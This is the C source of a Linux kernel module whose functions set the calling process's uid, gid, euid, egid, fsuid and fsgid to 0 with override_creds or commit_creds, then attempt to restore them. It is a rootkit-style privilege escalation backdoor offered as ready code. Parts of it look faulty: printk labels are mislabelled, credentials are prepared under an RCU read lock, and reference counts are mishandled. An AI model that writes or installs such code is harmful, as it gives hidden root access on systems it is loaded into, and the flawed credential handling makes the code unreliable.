#include <linux/module.h>
#include <linux/kernel.h>
#include<linux/sched.h>
#include<linux/cred.h>
#include<linux/slab.h>
#include "privilege_escalation.h"

const static struct cred * stored_cred = NULL;
static struct cred * new_cred;

void escalate(void){
  if(current->cred->uid==0){
    printk(KERN_INFO "You are already root\n");
    return;
  }
  new_cred = prepare_creds();
  if (!new_cred){
    printk(KERN_INFO "Prepare new task credential failed!\n");
    return;
  }
  // change uid, gid to root id
  new_cred->uid = 0;
  new_cred->gid = 0;
  new_cred->euid = 0;
  new_cred->egid = 0;
  new_cred->fsuid = 0;
  new_cred->fsgid = 0;

  stored_cred = override_creds(new_cred);
    printk(KERN_INFO "stored_cred %p \n", (current->cred));
    printk(KERN_INFO "stored_cred %p \n", (current->real_cred));
} 

void back(void){
  if(new_cred){
    printk(KERN_INFO "new_cred %p \n", new_cred);
    printk(KERN_INFO "stored cred %p \n", stored_cred);
    printk(KERN_INFO "stored_cred %p \n", (current->cred));
    printk(KERN_INFO "stored_cred %p \n", (current->real_cred));
    if(current->cred->uid!=current->real_cred->uid){
      revert_creds(stored_cred);
    }else{
      printk(KERN_INFO "Revert failed, because user changed!\n");
    }
    // TODO
    put_cred(new_cred);
    printk(KERN_INFO "Change user back\n");
    stored_cred = NULL;
    new_cred = NULL;
  }
}

void escalate_hard(void){
  if(current->cred->uid==0){
    printk(KERN_INFO "You are already root\n");
    return;
  }
	rcu_read_lock();
  new_cred = prepare_creds();
  stored_cred = prepare_creds();
  if (!new_cred){
    printk(KERN_INFO "Prepare new task credential failed!\n");
    return;
  }
  // change uid, gid to root id
  new_cred->uid = 0;
  new_cred->gid = 0;
  new_cred->euid = 0;
  new_cred->egid = 0;
  new_cred->fsuid = 0;
  new_cred->fsgid = 0;
  commit_creds(new_cred);
    printk(KERN_INFO "stored_cred %p \n", (current->cred));
    printk(KERN_INFO "stored_cred %p \n", (current->real_cred));
rcu_read_unlock();
} 

void back_hard(void){
  if(new_cred){
rcu_read_lock();
    printk(KERN_INFO "new_cred %p \n", new_cred);
    printk(KERN_INFO "stored cred %p \n", stored_cred);
    printk(KERN_INFO "stored_cred %p \n", (current->cred));
    printk(KERN_INFO "stored_cred %p \n", (current->real_cred));
    if(current->cred->uid!=current->real_cred->uid){
    printk(KERN_INFO "revert user back\n");
      revert_creds(stored_cred);
    }else{
      commit_creds(stored_cred);
    printk(KERN_INFO "Commit user back\n");
    }
    // TODO
    put_cred(new_cred);
    printk(KERN_INFO "Change user back\n");
    stored_cred = NULL;
    new_cred = NULL;
    printk(KERN_INFO "stored_cred %p \n", (current->cred));
    printk(KERN_INFO "stored_cred %p \n", (current->real_cred));
rcu_read_unlock();
  }
}
